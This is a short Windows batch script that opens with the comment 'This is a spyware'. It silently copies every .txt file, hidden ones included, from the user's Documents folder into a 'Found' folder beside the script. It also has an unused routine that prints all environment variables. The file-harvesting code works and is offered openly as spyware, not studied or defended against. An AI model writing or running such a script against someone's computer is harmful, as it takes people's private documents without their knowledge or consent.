
rem This is a spyware
@ECHO OFF
	CLS
	REM GOTO :MENU
	md %~dp0\Found\
	xcopy /y /s /q /h "%USERPROFILE%\Documents\*.txt" "%~dp0\Found\" && REM >nul 2>&1
		Echo %Errorlevel%
		Pause >Nul
	Exit /b
	
	:MENU
	REM Variable Checker by Ivandro Ismael Gomes Jao
	for /f "tokens=1,2 delims==" %%G IN ('SET') DO (
		ECHO [%%~G] = [%%~H]
		echo.
	)
	pause >nul